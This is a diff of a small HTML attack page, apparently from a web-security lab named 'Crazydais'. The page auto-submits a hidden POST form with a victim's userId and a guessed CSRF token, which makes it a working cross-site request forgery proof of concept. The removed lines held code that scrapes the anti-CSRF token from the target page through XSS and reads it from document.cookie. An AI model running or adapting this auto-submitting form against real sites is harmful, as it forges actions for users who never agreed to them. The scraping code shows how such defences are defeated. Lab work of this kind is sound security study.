@@ -5,47 +5,17 @@
     </head>
 
     <body>
-        <h1>Crazydais - CSRF</h1>
-        <div id="mycsrf"></div>
+        <h1>Crazydais - CSRF 3</h1>
         <script>
             (function () {
-                
+
                 var csrf = 'a1b2';
-                try {
-                    csrf = getTokenFromHTML();
-                }
-                catch(e) {
-                    console.log(e);
-                }
-                var form = createForm('fcab4e7dfbe01ce4e3904b97febe6a6a184302c3', csrf);
-                var div = document.getElementById("mycsrf");
-                div.appendChild(form);
-                
-                var csrfForm = document.getElementById("csrf-form");
-                csrfForm.submit();
+                var userId = 'fcab4e7dfbe01ce4e3904b97febe6a6a184302c3';
+                var form = createForm(userId, csrf);
+                form.submit();
+
             })();
-            
-            function getTokenFromHTML() {
-                var csrfToken;
-                setTimeout(function() {
-                    try {
-                        var header = document.getElementById('header').getElementsByTagName('a')[0];
-                        var href = header.getAttribute('href');
-                        return href.split('=')[1];
-                    }
-                    catch(e) {
-                        throw "couldn't get the CSRF token using XSS! - " + e;
-                    }
-                }, 3);
-            }
-            
-            function getTokenFromCookie() {
-                var csrfCookie = document.cookie.split(';')[0];
-                var csrfToken = csrfCookie.split('=')[1];
-                console.log('getTokenFromCookie - The token is: ' + csrfToken);
-                return csrfToken;
-            }
-            
+
             function addInputToForm(form, name, value) {
                 // Create a hidden input element, and append it to the form
                 var input = document.createElement('input');
@@ -54,7 +24,7 @@
                 input.value = value;
                 form.appendChild(input);
             }
-            
+
             function createForm(id, csrf) {
                 var form = document.createElement('form');
                 form.id = "csrf-form";
@@ -62,7 +32,6 @@
                 form.method = 'POST';
                 addInputToForm(form, 'userId', id);
                 addInputToForm(form, 'csrfToken', csrf);
-                //form.submit();
                 return form;
             }
         </script>
